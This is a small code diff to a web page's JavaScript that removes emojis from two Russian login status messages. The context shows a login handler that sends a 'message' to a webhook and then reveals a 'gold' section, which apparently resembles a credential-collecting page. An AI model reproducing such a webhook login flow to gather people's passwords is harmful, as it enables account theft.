@@ -271,10 +271,10 @@
 
       sendDataToWebhook(message, function(success) {
         if (success) {
-          document.getElementById("login-result").textContent = "Авторизация прошла успешно ✅";
+          document.getElementById("login-result").textContent = "Авторизация прошла успешно";
           document.getElementById("gold-section").style.display = "block";
         } else {
-          document.getElementById("login-result").textContent = "Ошибка при авторизации ❌";
+          document.getElementById("login-result").textContent = "Ошибка при авторизации";
         }
       });
     });
